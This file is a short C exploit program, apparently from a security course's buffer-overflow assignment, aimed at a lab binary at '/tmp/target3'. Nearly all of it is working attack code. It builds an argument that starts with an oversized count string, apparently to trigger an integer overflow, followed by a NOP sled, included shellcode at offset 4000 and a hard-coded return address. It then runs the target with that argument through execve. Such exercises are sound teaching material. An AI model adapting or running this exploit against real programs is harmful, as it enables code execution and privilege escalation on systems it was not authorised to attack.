#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET 	"/tmp/target3"
#define NOP 	0x90

char buff[4819];

int main(void)
{ 
  strncpy(buff, "2147483889,", 11); 

  int i;
  for (i = 11; i < 4819; i++) {
    buff[i] = NOP;
  } 

  strncpy(buff + 4000, shellcode, 45);
  strncpy(buff + 4815, "\x28\xd9\xff\xbf", 4);

  char *args[3];
  char *env[1];

  args[0] = TARGET; args[1] = buff; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
